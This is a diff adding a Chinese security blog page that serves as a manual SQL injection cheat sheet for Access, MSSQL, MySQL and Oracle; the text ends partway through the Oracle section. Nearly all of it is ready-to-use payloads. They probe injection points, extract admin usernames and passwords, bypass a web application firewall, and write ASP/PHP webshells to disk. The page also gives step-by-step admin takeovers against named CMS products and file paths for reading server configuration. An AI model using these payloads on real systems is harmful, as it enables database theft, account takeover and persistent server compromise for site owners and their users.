@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 基本常识简单判定有无漏洞：粗略型：提交单引号’逻辑型（数字型注入）：and 1=1&#x2F;and 1=2逻辑型（字符型注入）：’ and ‘1’=’1&#x2F;‘ and ‘1’=’2逻辑型（搜索型注入）：%’ and 1=1 and ‘%’=’%&#x2F;%’ and 1=2 and ‘%’=’%">
+<meta name="keywords" content="sqli">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACCESS、MSSQL、MYSQL、ORACLE 手工注入">
+<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;web-security&#x2F;manual-injection-of-access-mssql-mysql-and-oracle.html">
+<meta property="og:site_name" content="ZeroKeeper">
+<meta property="og:description" content="0x01 基本常识简单判定有无漏洞：粗略型：提交单引号’逻辑型（数字型注入）：and 1=1&#x2F;and 1=2逻辑型（字符型注入）：’ and ‘1’=’1&#x2F;‘ and ‘1’=’2逻辑型（搜索型注入）：%’ and 1=1 and ‘%’=’%&#x2F;%’ and 1=2 and ‘%’=’%">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-10-20T07:31:45.000Z">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ACCESS、MSSQL、MYSQL、ORACLE 手工注入</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/web-security/sqlilibs-learning-notes-1-10-off.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/tools/use-of-msfvenom.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&text=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&title=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&is_video=false&description=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ACCESS、MSSQL、MYSQL、ORACLE 手工注入&body=Check out this article: http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&title=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&title=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&title=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&title=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&name=ACCESS、MSSQL、MYSQL、ORACLE 手工注入&description=&lt;h2 id=&#34;0x01-基本常识&#34;&gt;&lt;a href=&#34;#0x01-基本常识&#34; class=&#34;headerlink&#34; title=&#34;0x01 基本常识&#34;&gt;&lt;/a&gt;0x01 基本常识&lt;/h2&gt;&lt;p&gt;简单判定有无漏洞：&lt;br&gt;粗略型：提交单引号’&lt;br&gt;逻辑型（数字型注入）：and 1=1/and 1=2&lt;br&gt;逻辑型（字符型注入）：’ and ‘1’=’1/‘ and ‘1’=’2&lt;br&gt;逻辑型（搜索型注入）：%’ and 1=1 and ‘%’=’%/%’ and 1=2 and ‘%’=’%&lt;/p&gt;" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本常识"><span class="toc-number">1.</span> <span class="toc-text">0x01 基本常识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-ACCESS注入基本流程："><span class="toc-number">2.</span> <span class="toc-text">0x02 ACCESS注入基本流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-MSSQL报错注入基本流程："><span class="toc-number">3.</span> <span class="toc-text">0x03 MSSQL报错注入基本流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一"><span class="toc-number">4.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二"><span class="toc-number">5.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-MYSQL注入基本流程："><span class="toc-number">6.</span> <span class="toc-text">0x04 MYSQL注入基本流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一-1"><span class="toc-number">7.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二-1"><span class="toc-number">8.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Oracle注入"><span class="toc-number">9.</span> <span class="toc-text">0x05 Oracle注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-参考"><span class="toc-number">10.</span> <span class="toc-text">0x06 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ACCESS、MSSQL、MYSQL、ORACLE 手工注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZeroKeeper</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-03-04T23:59:00.000Z" itemprop="datePublished">2017-03-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/web-security/">web-security</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/sqli/" rel="tag">sqli</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-基本常识"><a href="#0x01-基本常识" class="headerlink" title="0x01 基本常识"></a>0x01 基本常识</h2><p>简单判定有无漏洞：<br>粗略型：提交单引号’<br>逻辑型（数字型注入）：and 1=1/and 1=2<br>逻辑型（字符型注入）：’ and ‘1’=’1/‘ and ‘1’=’2<br>逻辑型（搜索型注入）：%’ and 1=1 and ‘%’=’%/%’ and 1=2 and ‘%’=’%</p>
+<a id="more"></a>
+<p>简单判断数据库信息：</p>
+<p>粗略型：<br>加单引号’（根据服务器报错的信息来判断）<br>加;–（;表示分离，– 则是注释符，;和–MSSQL数据库有，ACCESS数据库没有）</p>
+<p>逻辑型：<br>and user&gt;0<br>and (select count() from msysobjects)&gt;0 ……（页面错误为access数据库）<br>and (select count() from sysobjects)&gt;0 ……（页面正常为MSSQL数据库）<br>and db_name()&gt;0 ……（爆数据库名）<br>and version&gt;0（爆SQLServer版本信息以及服务器操作系统的类型和版本信息）</p>
+<p>判断MSSQL权限：<br>and 0&lt;&gt;(Select ISSRVROLEMEMBER(‘sysadmin’))–（页面正常则为SA）<br>and 0&lt;&gt;（Select IS_MEMBER（’db_owner’))–（页面正常则为db_owner）<br>and 0&lt;&gt;（Select IS_MEMBER（’public’))–（页面正常则是public）<br>注意：<br>以上方法适用于参数是int数字型的时候。<br>若为字符型，需在参数后添加单引号’并在查询语句后添加;–，搜索型注入以此类推。</p>
+<h2 id="0x02-ACCESS注入基本流程："><a href="#0x02-ACCESS注入基本流程：" class="headerlink" title="0x02 ACCESS注入基本流程："></a>0x02 ACCESS注入基本流程：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1、判断有无注入点</span><br><span class="line">&apos;  and 1=1	and 1=2</span><br><span class="line">2、猜表一般的表的名称无非是admin adminuser user pass password </span><br><span class="line">and 0&lt;&gt;(select count(*) from *)	</span><br><span class="line">and exists (select * from admin)</span><br><span class="line">and 0&lt;&gt;(select count(*) from admin)</span><br><span class="line">3、爆破帐号数目 如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个</span><br><span class="line">and 0&lt;(select count(*) from admin)</span><br><span class="line">and 1&lt;(select count(*) from admin)</span><br><span class="line">4、猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.</span><br><span class="line">  常用的表名：admin user news manage a_admin x_admin m_admin adminuser admin_user article_admin administrator manager member memberlist users                                          Manage_User user_info admin_userinfo login new用户会员</span><br><span class="line">  常用的列名：username password id adminusername admin_username adminname admin_name admin adminuser admin_user user_name user_admin  administrator administrators adminpassword admin_pwd adminpass userpass user_pass  admin_passwod  用户 用户名 密码 帐号</span><br><span class="line"></span><br><span class="line">and exists (select 你要猜的字段名 from 你已经才出来的表名)</span><br><span class="line">and 1=(select count(*) from admin where len(*)&gt;0)--</span><br><span class="line">and 1=(select count(*) from admin where len(username)&gt;0)</span><br><span class="line">and 1=(select count(*) from admin where len(password)&gt;0)</span><br><span class="line">5.猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止</span><br><span class="line">and 1=(select count(*) from admin where len(username)&gt;6) 错误</span><br><span class="line">and 1=(select count(*) from admin where len(username)&gt;5) 正确 长度是6</span><br><span class="line">and 1=(select count(*) from admin where len(username)=6) 正确</span><br><span class="line">6.猜解字符</span><br><span class="line">and 1=(select count(*) from admin where left(username,1)=&apos;a&apos;) ---猜解用户帐号的第一位</span><br><span class="line">and 1=(select count(*) from admin where left(username,2)=&apos;ab&apos;)---猜解用户帐号的第二位</span><br><span class="line">就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了</span><br><span class="line">7.更改管理员密码， 添加管理员帐户</span><br><span class="line">更改密码：</span><br><span class="line">; update admin set password =&apos;dukong&apos; where username=admin</span><br><span class="line">添加管理员：</span><br><span class="line">; insert into admin (username,password) values (dukong,dukong)--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ACCESS偏移注入</span><br><span class="line">order by n 直到返回不正常，那么返回的列数就是n-1</span><br><span class="line">union select 1,2,3,4,5,...,n-1 from admin会是正常的</span><br><span class="line">然后用 * 代替查看admin表里面字段数</span><br><span class="line">最后爆出admin账户， 会用到union select 1,2,3,4,...,from admin as a inner join admin as b on a.id=b.id 反正凑出字段数与 order by 查询的返回字段数相同来暴库</span><br><span class="line"></span><br><span class="line">过安全狗：</span><br><span class="line">/news.asp?letterkind=4&amp;parentID=3 an%d%200&lt;=(se%l%e%c%t co%unt(*) fr%om tb_login) an%d%201&lt;2</span><br><span class="line">/news.asp?letterkind=4&amp;parentID=3 an%d%200&lt;=(se%l%e%c%t co%unt(*) fr%om a_admin) an%d%201&lt;2 </span><br><span class="line">/news.asp?letterkind=4&amp;parentID=3 an%d%200&lt;=(se%l%e%c%t co%unt(new) fr%om admin) an%d%201&lt;2</span><br><span class="line"></span><br><span class="line">%</span><br><span class="line">an%d 1%=%1</span><br><span class="line">aN%d ex%is%ts (se%le%ct * f%r%om us%er)</span><br><span class="line">aN%d 0&lt;&gt;(se%le%ct co%u%nt(*) f%r%om *)</span><br><span class="line">a%n%d 0&lt;&gt;(s%el%ec%t c%ou%nt(*) f%r%om ad%mi%n)</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-MSSQL报错注入基本流程："><a href="#0x03-MSSQL报错注入基本流程：" class="headerlink" title="0x03 MSSQL报错注入基本流程："></a>0x03 MSSQL报错注入基本流程：</h2><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><pre><code>爆出表名和字段：having 1=1--
+
+猜解表名：
+获得第一个表名：
+and (select top 1 name from sysobjects where xtype=’u’)&gt;0
+获得第二个表名：
+and (select top 1 name from sysobjects where xtype=’u’ and name not in (‘user’))&gt;0
+以此类推。
+
+猜解列名：
+得到col_name表中的第一个列名：
+and (select top 1 col_name(object_id(‘字段’),1) from sysobjects)&gt;0
+
+猜解字段内容：
+and (select top 1 列名 from [表名])&gt;0
+如：
+获取用户名：
+and (select top 1 username from [admin])&gt;0
+获取密码：
+and (select top 1 password from [admin])&gt;0
+
+导出webshell：
+方法1：利用SQL执行命令功能导出WebShell
+SELECT ‘&lt;%execute request(“a”)%&gt;’ into [vote] in ‘d:webx.asp;.xls’ ‘excel 8.0;’ from vote
+注意：需拥有SQL执行权限且知道绝对路径
+方法2：
+建立一个有一个A字段的表 表名为a，字段类型为字符，长度为50。
+在表A的a字段插入一句话木马，把表a的内容导出为物理路径的一个EXCEL文件。
+导出为EXCEL后在利用IIS解析漏洞就可以变成webshell了。
+
+方法2的SQL语句：
+
+create table cmd (a varchar(50))
+insert into cmd (a) values (‘&lt;%execute request(“listentide”)%&gt;’)
+select * into [a] in ‘f:hostqhdyxtweba.asp;.xls’ ‘excel 4.0;’ from cmd
+drop table cmd</code></pre><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>漏洞：前端漏洞(常规方法检测，有错误回显)，传递 get 参数的时候没有过滤，直接连接到 SQL 语句上。</p>
+<pre><code>1.判断注入点方法：加 ‘ 报错，或是加 and 1=1 返回正常，加 and 1=2 返回错误，aspx 一般都是 SqlServer。
+2.判断数据库版本：加 and 1=@@version。
+3.查看数据库其他信息：查看服务器所在主机名称：and 1=host_name() ，查看当前用户：and 1=current_user 获得当前用户，设为 Current_User，
+查看当前数据库：and 1=db_name()，获得数据库名称，设为 DB_NAME。
+
+4.判断数据表名：and 1=(select top 1 name from DB_NAME.Current_User.sysobjects where xtype=CHAR(85) and name not in (select top N name from
+DB_NAME.Current_User.sysobjects where xtype=CHAR(85)))–，从 0 开始替换 N 返回表名。这个过程会得到一些有用的表，比如 XXX_admin，XXX_users==。
+5.对比较敏感的表进行进一步注入获得字段：and 1=(select top 1 Name from syscolumns where id=object_id(0x5700650062005F00410064006D0069006E00) and name not
+in(select top N Name from syscolumns where id=object_id(0x5700650062005F00410064006D0069006E00)))，从 0 开始替换 N 逐个返回列名。
+可能会获得一些有用的字段值，比如 username，password 等等。
+6.根据字段名称获得相应的字段内容：”and 1=(select top 1 [Column_Name] from XXX_admin)” 获得字段内容。XXX_admin 是获得的有用的表，Column_Name 是字段名称。</code></pre><h2 id="0x04-MYSQL注入基本流程："><a href="#0x04-MYSQL注入基本流程：" class="headerlink" title="0x04 MYSQL注入基本流程："></a>0x04 MYSQL注入基本流程：</h2><h2 id="一-1"><a href="#一-1" class="headerlink" title="一"></a>一</h2><p>MYSQL注入漏洞是否存在的判断方法与ACCESS注入和MSSQL注入相同。</p>
+<p>MYSQL注入漏洞的数据库类型判断方法也可以使用单引号’。</p>
+<pre><code>数据库权限判断：
+and ord(mid(user(),1,1))=114 // （页面正常说明为root）
+
+判断当前页面字段总数：
+方法1、用union联合查询：and 1=1 union select 1,2,3,4,5……
+方法2、用order by 查询“order by *–
+
+判断显示位：
+方法1、http://www.f4ck.org/article.php?id=1 and 1=2 union select 1,2,3,4,5,6,7……
+方法2、http://www.f4ck.org/article.php?id=-1 union select 1,2,3,4,5,6,7……
+
+查库：
+版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。
+获取第一个库名：
+and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1
+获取第二个库名：
+and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 1,2
+以此类推。
+
+查表：
+获取数据库中第一个表名：
+and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 0,1
+获取数据库中第二个表名：
+and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 1,2
+
+查列：
+获取数据库中指定表的第一个列名：
+and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1
+获取数据库中指定表的第二个列名：
+and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1
+
+得到字段内容：
+在不同的显示位显示不同的字段内容：
+and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1
+在同一个显示位显示不同的字段内容：
+and 1=2 Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1
+
+一次性查出所有表名：
+union select 1,2,3,4,GROUP_CONCAT(DISTINCT table_name),6 from information_schema.columns where table_schema=数据库名的16进制
+一次性查出所有字段名：
+union select 1,2,3,4,GROUP_CONCAT(DISTINCT column_name),6 from information_schema.columns where table_schema=数据库名的16进制
+
+导出一句话WebShell：
+方法1：
+Drop TABLE IF EXISTS temp;
+Create TABLE temp(cmd text NOT NULL);
+Insert INTO temp (cmd) VALUES(‘’);
+Select cmd from temp into out file ‘F:/wwwroot/eval.php’;
+Drop TABLE IF EXISTS temp;
+方法2：
+Select ‘’ into outfile ‘F:/wwwroot/eval.php’;
+
+load_file() 常用路径：
+
+c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件
+/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
+c:/Program Files/Apache Group/Apache/conf/httpd.conf 或C:/apache/conf/httpd.conf 查看WINDOWS系统apache的配置文件
+c:/Resin-3.0.14/conf/resin.conf查看jsp开发的网站 resin文件配置信息</code></pre><h2 id="二-1"><a href="#二-1" class="headerlink" title="二"></a>二</h2><pre><code>1.漏洞：前端漏洞（常规方法检测不到，用 %ce’ 检测有错误回显），GBK 宽字符转译导致的绕过 sql 注入安全检测。
+①.找到存在漏洞的 URL，常规方法看不到回显，将参数改成 %ce’ ，有回显。
+②.直接构造语句爆出后台账号密码：http://url/xxx.php?act=xxx&amp;xx=%ce’ and 1=1 union select 1 and (select 1 from(select count(*),concat((select concat(0x5b,user_name,0x3a,password,0x5d) FROM ecs_admin_user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23
+2.漏洞：前端漏洞(无错误回显)，wap/index.php 的 action 参数存在本地文件包含漏洞，包含可执行 sql 命令文件 field_add.inc.php，而在这个文件中如果参数为 action，没有任何限制和过滤就可以包含本地一个 .inc.php 的文件。field_add.inc.php 件可以看到，$dataformat 没有初始化，$sql 也没有初始化，所以可以直接调用 sql 命令。(怎么检测有这个漏洞？)
+①.注册一个普通用户，查看自己的 ID,userid = 2。
+②.构造 http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql= update phpcms_member SET groupid=1 where
+userid=2。更改注册账号的 groupid（组id）为 1 ，也就是将注册的 test 账号的组从普通用户组改为管理员组。
+③.http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql= update phpcms_member_cache SET groupid=1 where
+userid=2。更改注册账号在缓存表中的 groupid，使其不会因为缓存表未更改导致失败。
+④.http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql= insert INTO phpcms_admin
+(userid,username,allowmultilogin,alloweditpassword) values(2,test,1,1)。将 test 用户插入管理员表，并赋予 test 用户管理员具有的相关权限（后台登录和修改密码的权限）。
+⑤.http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql= insert INTO phpcms_admin_role (userid,roleid)
+values(2,1)。将 test 角色信息插入管理员角色表，使 test 角色为管理员的角色。
+⑥.用test用户登录，即是管理员。
+3.漏洞：前端漏洞（常规方法检测，有错误回显），传递 get 参数的时候没有过滤，直接拼接到 SQL 语句上。
+①.常规方法检测注入点，有错误回显，可能直接返回数据库类型。
+②.判断字段长度：后面加上 order by N，从数字 1 开始替代 N，直到返回错误页面，判断字段长度为错误页面的 N-1，也就是最后一个正常页面返回。
+③.判断字段位置回显：加上 and 1=2 union select 1,2,3,4,5,……,N-1 最后一个数为字段长度，有回显会将相应数字显示出来。
+④.判断数据库信息：加上 and 1=2 union select 1,2,sql_command,4,5,6,7,8,9,10,11,……,N-1 用 sql 指令替换 sql_command。用 version(),database(),user() 替换。
+！！！注意：这里所得到的当前用户必须是 DBA 或是系统管理员，否则是进行不下去的，因为后面要用到系统表。
+⑤.判断 mysql 所有数据库：加上 and 1=2 union select 1,2,group_concat(convert(SCHEMA_NAME using latin1)),4,5,6,7,8,9,10,……,N-1 from
+information_schema.SCHEMATA ，查看 mysql 中所有数据库的名称。
+⑥.判断数据库表：加上 and 1=2 union select 1,2,group_concat(convert(table_name using latin1)),4,5,6,7,8,9,10,……,N-1 from information_schema.tables where
+table_schema=database()，查看当前数据库拥有的所有表。可以发现存放用户信息的表 XXX_users，XXX_admin。
+⑦.判断数据表的所有列：加上 and 1=2 union select 1,2,group_concat(convert(column_name using latin1)),4,5,6,7,8,9,10,……,N-1 from information_schema.columns
+where table_name=0x636D735F7573657273。table_name=XXX_users，表名需要编码为 16 进制。可能会得到有用的列：userid，username，password 等等。
+⑧.获取字段值：加上 and 1=2 union select 1,2,concat_ws(0x2b,userid,username,password),4,5,6,7,8,9,10,……,N-1 from cms.XXX_users。得到数据。
+⑨.解密登陆。
+4.漏洞：前端漏洞(有错误回显)，shopex 的 cookie 攻击漏洞。
+①.判断注入点：注册账号并登陆，使用 firefox 的 cookiemanager 对 cookie 进行操作。查看 cookie，在 S[CUR] 值后面添加 ‘ 进行验证，发现页面没什么变化，再次使用
+” 进行测试。从报错信息中可以获得表前缀为 sdb_，及 sql 语句拼接方式、数据库类型等等数据库信息。
+②.判断字段数：使用” LIMIT 1,1 UNION ALL SELECT 11#
+” LIMIT 1,1 UNION ALL SELECT 11，22#
+” LIMIT 1,1 UNION ALL SELECT 11，22，33#
+……
+判断当前表中的字段数，并确定页面显示的字段。从页面中可以判断出该表共有 N 个字段，并且页面显示的是第 X 个字段。（设 N=6，X=3）
+③.查询系统管理员用户：在 shopex 中，管理员用户信息保存在 sdb_operators 表中，使用” LIMIT 1,1 UNION ALL SELECT 11,22,(select count(*) from
+sdb_operators),44,55,66# 查询管理员人数。
+④.查询管理员用户名和密码：加上 ” LIMIT 1,1 UNION ALL SELECT 11,22,(select username from sdb_operators limit 0,1),44,55,66# 查询用户名。得到用户名 xxxx。
+⑤.使用” LIMIT 1,1 UNION ALL SELECT 11,22,(select userpass from sdb_operators where username=’xxxx’),44,55,66# 查询管理员密码。
+⑥.解密登陆。
+5.漏洞：DISCUZ 漏洞(有错误回显)：二次注入，在进行添加回复操作的时候，未对原先存在的 message 信息进行特殊字符过滤，且该 message 直接拼接到 sql 语句中，导致特殊
+sql 语句的执行。
+6.漏洞：前端漏洞(无错误回显)：登陆绕过检测，网站有多处都调用并带入 admin_name 进行查询，虽然在 POST 数据时进行了过滤（首次提交返回错误页面的原因）。但因
+get_admin_one 函数和 check_admin 函数没有对带入的 admin_name 进行校验或过滤，导致 sql 注入。
+对带入的 admin_name 进行校验或过滤，导致 sql 注入。
+在后台登陆界面用户名密码随便输，验证码填正确，burp 抓包：修改 POST 提交的数据，修改其中的 admin_name 值为 XXXX%d5′ or 1=1%23 ，
+其中 XXXX 为管理员账号，放行，第一次肯定不成功（因为在 post 数据时进行了过滤），刷新一下就能绕过直接进后台。</code></pre><h2 id="0x05-Oracle注入"><a href="#0x05-Oracle注入" class="headerlink" title="0x05 Oracle注入"></a>0x05 Oracle注入</h2><p>漏洞：前端漏洞(有错误回显)，get 参数未过滤直接拼接到 SQL 语句。</p>
+<pre><code>1.常规方法检测注入点，有错误回显，可能直接返回数据库类型。
+2.判断数据库类型：在url的后面添加&quot;/*&quot;,页面返回错误，说明不是 mysql 数据库，然后使用 &apos;and (select count(*) from user_tables)&gt;0– 返回正常，判断该数据库为oracle 数据库，因为只有 oracle 数据库才有 user_tables 表。
+3.获取字段数：使用’ order by 1 — ，通过变换数值，当页面报错时，则字段数就是报错之前的数，设当’ order by N– 页面报错，说明共有 N-1 个字段，设 N=5，通过
+&apos; union select null,null,null,null from user_tables order by 1 desc– 返回正常页面验证字段确实为 4 个。
+4.判断字段类型：通过
+&apos; union select &apos;null&apos;,null,null,null from user_tables order by 1 desc–
+&apos; union select null,&apos;null&apos;,null,null from user_tables order by 1 desc–
+&apos; union select null,null,’null’,null from user_tables order by 1 desc–
+……
+判断各字段数据类型：那个返回正确说明那个就是字符型，否则可能是整型或其他类型。(设 2.3 是字符型)。
+5.判断各字段在页面中的显示位置：&apos; union select 1,&apos;2&apos;,&apos;3&apos;,4 from user_tables order by 1 desc– 可能得到 2.3.4 在网页中的显示位置。
